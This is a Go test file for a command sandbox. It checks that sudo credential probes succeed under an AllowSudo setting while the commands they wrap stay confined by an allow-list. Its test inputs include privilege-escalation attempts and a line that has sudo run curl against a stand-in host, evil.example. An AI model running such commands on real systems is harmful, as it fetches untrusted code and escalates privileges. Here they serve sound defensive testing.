package sandbox

import (
	"strings"
	"testing"
)

// TestAllowSudo: with AllowSudo the sandbox answers sudo's credential probes
// with success, so a script gated on `sudo -v` / `sudo -n -l CMD` proceeds —
// but nothing escalates: `sudo CMD` is still unwrapped and CMD confined by the
// allow-list. Off, a probe is blocked like any other non-allow-listed command,
// and -disable sudo beats the grant.
func TestAllowSudo(t *testing.T) {
	grant := func(c *Config) { c.AllowSudo = true }
	probes := `sudo -n -v && sudo -n -l mkdir >/dev/null && /usr/bin/sudo -nl mkdir && doas -n true && sudo -K && echo GRANTED`
	out, er, err := runConfined(t, probes, grant)
	if err != nil || !strings.Contains(out, "GRANTED") {
		t.Errorf("sudo probes should succeed under AllowSudo; out=%q stderr=%q err=%v", out, er, err)
	}
	if !strings.Contains(er, "[sandbox] granted sudo -n -v") {
		t.Errorf("expected the grant to be reported; stderr=%q", er)
	}
	// Still de-escalated: the inner command is what runs, and it is confined.
	for script, want := range map[string]string{
		`sudo -n -v && sudo -E dpkg-reconfigure tzdata`:                      "blocked command: dpkg-reconfigure",
		`sudo -v && sudo apt-get install docker-ce`:                          "network egress denied: apt-get → install",
		`sudo -n -l mkdir && sudo sh -c 'curl -sSfL https://evil.example/x'`: "URL not in allow-list",
	} {
		if _, er, err := runConfined(t, script, grant); err == nil || !strings.Contains(er, want) {
			t.Errorf("%q should still fail with %q; stderr=%q err=%v", script, want, er, err)
		}
	}
	// Off: the probe is not allow-listed.
	if _, er, err := runConfined(t, `sudo -n -v`); err == nil || !strings.Contains(er, "blocked command: sudo") {
		t.Errorf("without AllowSudo the probe should be blocked; stderr=%q err=%v", er, err)
	}
	if _, er, err := runConfined(t, `sudo -n -l mkdir`); err == nil || !strings.Contains(er, "blocked command: sudo") {
		t.Errorf("without AllowSudo `sudo -l CMD` is a probe, not a run of CMD; stderr=%q err=%v", er, err)
	}
	// Disabled beats granted.
	_, er, err = runConfined(t, `sudo -n -v`, grant, func(c *Config) { c.Disable("sudo") })
	if err == nil || !strings.Contains(er, "disabled command: sudo") {
		t.Errorf("-disable sudo should win over AllowSudo; stderr=%q err=%v", er, err)
	}
}
